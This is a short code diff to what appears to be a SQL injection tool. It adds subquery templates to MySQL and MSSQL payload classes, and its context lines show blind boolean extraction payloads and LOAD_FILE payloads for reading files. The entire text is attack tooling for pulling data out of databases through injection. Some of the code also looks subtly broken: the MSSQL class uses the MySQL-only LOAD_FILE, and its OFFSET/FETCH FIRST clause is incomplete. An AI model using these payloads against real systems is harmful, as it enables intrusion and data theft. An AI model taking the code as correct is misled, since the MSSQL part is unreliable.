@@ -13,6 +13,8 @@ class MysqlPayloads:
 
         self.str_file = "(LOAD_FILE({}))"
 
+    def one_line_query(self, column, table, where='', offset=0):
+        return "(SELECT {} from {} {} LIMIT 1 OFFSET {})".format(column, table, where, offset)
 
 class MssqlPayloads:
 
@@ -28,3 +30,6 @@ class MssqlPayloads:
         self.and_char_at_gt = self.prefix + " ascii(SUBSTRING({}, {},1)) > {}"
 
         self.str_file = "(LOAD_FILE({}))"
+
+    def one_line_query(self, column, table, where='', offset=0):
+        return "(SELECT {} from {} {} OFFSET {} FETCH FIRST)".format(column, table, where, offset)
